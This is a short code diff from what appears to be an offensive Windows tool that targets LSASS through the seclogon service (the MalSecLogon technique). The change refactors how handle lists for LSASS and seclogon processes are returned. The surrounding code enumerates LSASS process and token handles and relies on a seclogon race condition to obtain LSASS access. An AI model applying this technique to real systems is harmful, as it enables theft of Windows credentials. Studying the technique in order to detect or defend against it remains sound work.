@@ -297,10 +297,11 @@ BOOL malseclogon_stage_1(
 
     DPRINT("command line: %ls", command_line);
 
-    handle_list = find_process_handles_in_process(
+    success = find_process_handles_in_process(
         lsass_pid,
-        LSASS_DEFAULT_PERMISSIONS);
-    if (!handle_list)
+        LSASS_DEFAULT_PERMISSIONS,
+        &handle_list);
+    if (!success)
         goto cleanup;
 
     if (handle_list->Count == 0)
@@ -462,10 +463,11 @@ VOID malseclogon_trigger_lock(
     if (success)
     {
         // find token handles within LSASS
-        handle_list = find_token_handles_in_process(
+        success = find_token_handles_in_process(
             lsass_pid,
-            0);
-        if (!handle_list || !handle_list->Count)
+            0,
+            &handle_list);
+        if (!success || !handle_list->Count)
         {
             DPRINT("No token handles found in " LSASS ", can't use CreateProcessWithToken(). Reverting to CreateProcessWithLogon()...");
             useCreateProcessWithToken = FALSE;
@@ -874,10 +876,11 @@ HANDLE malseclogon_race_condition(
     seclogon_permissions |= PROCESS_DUP_HANDLE;
 
     // look for a handle owned by seclogon with the specified permissions
-    handle_list = find_process_handles_in_process(
+    success = find_process_handles_in_process(
         seclogon_pid,
-        seclogon_permissions);
-    if (!handle_list || !handle_list->Count)
+        seclogon_permissions,
+        &handle_list);
+    if (!success || !handle_list->Count)
     {
         PRINT_ERR("No process handles found in seclogon. The race condition didn't work.");
         goto end;
